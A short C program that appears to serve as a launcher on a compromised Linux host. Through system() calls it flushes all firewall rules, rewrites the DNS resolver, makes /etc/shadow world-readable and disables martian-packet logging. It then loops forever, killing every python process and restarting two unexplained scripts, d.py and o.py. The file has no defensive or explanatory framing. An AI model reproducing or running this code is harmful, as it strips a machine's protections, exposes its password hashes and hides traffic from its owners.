#include <stdio.h>

main(){

        system("iptables -F");
	system("echo 'nameserver 8.8.8.8' > /etc/resolv.conf");
	system("chmod 755 /tmp");
	system("chmod 644 /etc/passwd /etc/shadow");
	system("echo '1' > /proc/sys/net/ipv4/conf/default/rp_filter");
	system("echo '0' > /proc/sys/net/ipv4/conf/default/log_martians");
	system("echo '0' > /proc/sys/net/ipv4/conf/default/accept_source_route");
	system("echo '10' > /proc/sys/net/ipv4/tcp_keepalive_time");
	system("echo '10' > /proc/sys/net/ipv4/tcp_keepalive_intvl");
	system("echo '3' > /proc/sys/net/ipv4/tcp_keepalive_probes");
	system("echo '1' > /proc/sys/net/ipv4/tcp_fin_timeout");
	system("echo '0' > /proc/sys/net/ipv4/ip_forward");
	system("echo '1025 65530' > /proc/sys/net/ipv4/ip_local_port_range");
	system("echo '1' > /proc/sys/net/ipv4/tcp_tw_reuse");
	system("sysctl -p");

	while(1){

		system("pkill -9 python");

        	system("python d.py &");
	        system("python o.py &");

		sleep(10);

	}

        return 0;

}
